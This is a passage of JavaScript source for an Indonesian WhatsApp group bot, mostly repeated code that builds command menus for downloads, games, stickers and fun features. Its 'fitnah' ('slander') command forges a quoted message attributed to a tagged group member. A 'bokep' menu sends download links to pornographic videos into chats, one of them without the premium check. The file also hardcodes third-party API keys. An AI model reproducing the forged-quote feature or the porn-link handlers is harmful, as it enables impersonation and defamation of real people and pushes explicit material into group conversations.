               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
        
       case 'downloadmenu':
        case  'menudownload':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
           menu =`${botName}


▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

    

┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}fb 
┃▹  ${prefix}igdl 
┃▹  ${prefix}igdl2 
┃▹  ${prefix}twitter 
┃▹  ${prefix}tiktok 
┃▹  ${prefix}play 
┃▹  ${prefix}ythd 
┃▹  ${prefix}ytmp3 
┃▹  ${prefix}ytmp4 
┃▹  ${prefix}soundcloud 
┃▹  ${prefix}tiktoknowm 
┃▹  ${prefix}tiktokaudio
┃▹  ${prefix}mediafire 
┃▹  ${prefix}joox 
┃▹  ${prefix}nhentaipdf *code*
┗⬡ `

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
   


 𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
  𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
   
     case 'othermenu':
        case  'menuother':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
           menu =`${botName}
           
           
▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

    
 
┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}brainly *query*
┃▹  ${prefix}tts *code_bahasa* *query*
┃▹  ${prefix}translate *code_bahasa* *query*
┃▹  ${prefix}shopee *product*
┃▹  ${prefix}playstore *query*
┃▹  ${prefix}ssweb *query*
┃▹  ${prefix}google *query*
┃▹  ${prefix}image *query*
┃▹  ${prefix}pinterest *query*
┃▹  ${prefix}nulis *teks*
┃▹  ${prefix}iguser *ussername*
┃▹  ${prefix}igstalk *username*
┃▹  ${prefix}githubstalk *username*
┃▹  ${prefix}tiktokstalk *ussername*
┃▹  ${prefix}img2url *reply foto*
┃▹  ${prefix}ytsearch *query*
┗⬡ `

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
  

 𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
  𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 ??𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
   
   case 'gamemenu':
        case  'menugame':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
           menu =`${botName}


▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*


    
┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}slot
┃▹  ${prefix}limitgame
┃▹  ${prefix}gelud @tag
┃▹  ${prefix}tictactoe @tag
┃▹  ${prefix}siapaaku
┃▹  ${prefix}family100
┃▹  ${prefix}kuismath
┃▹  ${prefix}asahotak
┃▹  ${prefix}tebaklirik
┃▹  ${prefix}tebaklagu
┃▹  ${prefix}tebakkata
┃▹  ${prefix}susunkata
┃▹  ${prefix}kimiakuis
┃▹  ${prefix}caklontong
┃▹  ${prefix}tebakjenaka
┃▹  ${prefix}tebakanime
┃▹  ${prefix}tebaktebakan
┃▹  ${prefix}tebakgambar
┃▹  ${prefix}tebakbendera
┃▹  ${prefix}suit *batu/kertas/gunting*
┗⬡ `

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   


 𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
  𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
               case 'stickermenu':
        case  'stikermenu':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
      
 menu =`${botName}


▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡??𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*


┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}dadu
┃▹  ${prefix}doge
┃▹  ${prefix}toimg
┃▹  ${prefix}patrick
┃▹  ${prefix}garwgura
┃▹  ${prefix}ttg *teks*
┃▹  ${prefix}attp *teks*
┃▹  ${prefix}attp2 *teks*
┃▹  ${prefix}ttp *teks*
┃▹  ${prefix}ttp1 *teks*
┃▹  ${prefix}ttp2 *teks*
┃▹  ${prefix}ttp3 *teks*
┃▹  ${prefix}ttp4 *teks*
┃▹  ${prefix}stickeranime
┃▹  ${prefix}semoji *emoji*
┃▹  ${prefix}sticker *reply foto/video*
┃▹  ${prefix}smeme *teks|teks*
┃▹  ${prefix}swm *pack|author*
┃▹  ${prefix}take *pack|author* 
┃▹  ${prefix}tovideo *reply sgif*
┗⬡ 


𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
 𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞
`



               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   

 

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
                    case 'funmenu':
        case  'menufun':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
      
 menu =`${botName}


▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

     
┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}mining
┃▹  ${prefix}togel
┃▹  ${prefix}cekwatak
┃▹  ${prefix}cekmati [nama]
┃▹  ${prefix}wangy [nama]
┃▹  ${prefix}citacita
┃▹  ${prefix}toxic
┃▹  ${prefix}truth
┃▹  ${prefix}dare
┃▹  ${prefix}apakah
┃▹  ${prefix}bisakah
┃▹  ${prefix}kapankah
┃▹  ${prefix}rate
┃▹  ${prefix}jadian
┃▹  ${prefix}cantik
┃▹  ${prefix}ganteng
┃▹  ${prefix}beban
┃▹  ${prefix}babi
┃▹  ${prefix}cekganteng
┃▹  ${prefix}cekcantik
┗⬡ 


𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
 𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞
`
               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   


 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
   case 'infomenu':
        case  'menuinfo':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
      
 menu =`${botName}


              
▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

    
┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}update
┃▹  ${prefix}level
┃▹  ${prefix}rules
┃▹  ${prefix}profile
┃▹  ${prefix}waktu
┃▹  ${prefix}botstat
┃▹  ${prefix}sewabot
┃▹  ${prefix}listsewa
┃▹  ${prefix}owner
┃▹  ${prefix}ping
┃▹  ${prefix}runtime
┃▹  ${prefix}donasi
┃▹  ${prefix}leaderboard
┃▹  ${prefix}cekpremium
┃▹  ${prefix}listpremium
┃▹  ${prefix}sourcecode
┃▹  ${prefix}bugreport *keluhan*
┗⬡ 


𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
 𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞 `

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
               headerType: 1

  
 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
case 'bokepmenu':
        case  'menubokep':
                    if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
      
 menu =`${botName}


              
▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*


┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹ ${prefix}bokep1
┃▹ ${prefix}bokep2
┃▹ ${prefix}bokep3
┃▹ ${prefix}bokep4
┃▹ ${prefix}bokep5
┃▹ ${prefix}bokep6
┃▹ ${prefix}bokep7
┃▹ ${prefix}bokep8
┃▹ ${prefix}bokep9
┃▹ ${prefix}bokep10
┃▹ ${prefix}bokep11
┃▹ ${prefix}bokep12
┃▹ ${prefix}bokep13
┃▹ ${prefix}bokep14
┃▹ ${prefix}bokep15
┃▹ ${prefix}bokep16
┃▹ ${prefix}bokep17
┃▹ ${prefix}bokep18
┃▹ ${prefix}bokep19
┃▹ ${prefix}bokep20
┃▹ ${prefix}bokep21
┃▹ ${prefix}bokep22
┃▹ ${prefix}bokep23
┃▹ ${prefix}bokep24
┃▹ ${prefix}bokep25
┗⬡ 


𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
 𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞 `

               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
              

  
 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 1
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          dimas.relayWAMessage(prep)
               break
               case 'fitnah':
                 
                 
                                
                    if (!isGroup) return reply('ONLY GRUP')              
                    
                 
                if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag&pesan&balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
                var gh = body.slice(8)
                mentioned = dim.message.extendedTextMessage.contextInfo.mentionedJid
                    var replace = gh.split("|")[0];
                    var target = gh.split("|")[1];
                    var bot = gh.split("|")[2];
                     dimas.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
                    break
                    case 'addrespon':
            
                //if (args.length > 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
                argz = arg.split('|')
                if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
                addCommands(argz[0], argz[1], sender, commandsDB)
                reply(`Sukses menambahkan respon ${argz[0]}`)
                break
            case 'delrespon':
            
                if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
                if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
                reply(`Sukses menghapus respon ${body.slice(11)}`)
                break
                case 'affect':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/affect?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}affect`)
                    }
                    break
                    case 'ppcp':
case 'ppcouple':

anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=IkyOgiwara`)
                        buff1 = await getBuffer(anu.result.male)
                        buttons = [{buttonId: `!infoig`,buttonText:{displayText: `Follow @Dimas.edr`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff1, "imageMessage", { thumbnail: buff1, })).imageMessage
              buttonsMessage = {footerText:'Crated by Dimas Gans', imageMessage: imageMsg,
              contentText:`Cowo`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
            buff2 = await getBuffer(anu.result.female)
              buttons = [{buttonId: `!infoig`,buttonText:{displayText: `Follow @Dimas.edr`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff2, "imageMessage", { thumbnail: buff2, })).imageMessage
              buttonsMessage = {footerText:'Crated by Dimas Gans', imageMessage: imageMsg,
              contentText:`Cewe`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
             setTimeout( async () => {
 dimas.relayWAMessage(prep)
}, 5000)
break
case 'joox':
                //if (!isRegistered) return reply( ind.noregis())
               // if (isLimit(sender)) return reply(ind.limitend(pusname))
               // if (isBanned) return reply('Maaf kamu sudah terbenned!')
                reply('please wait..')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jooxplay?apikey=${lol}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    dimas.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    dimas.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: freply })
                    break
                    
   //addfiturbokep
                case 'bokep1':				 
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })
				   break
				   case 'bokep2':

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' })
				   break
				   case 'bokep3':            
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
	

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file' })				    
				   break
				   case 'bokep4':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' })				   
				   break
				   case 'bokep5':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' })				   
				   break
				   case 'bokep6':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' })				   
				   break
                   case 'bokep7':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' })				   
				   break
		           case 'bokep8':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' })				   
				   break
	
				   case 'bokep10':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' })				   
				   break
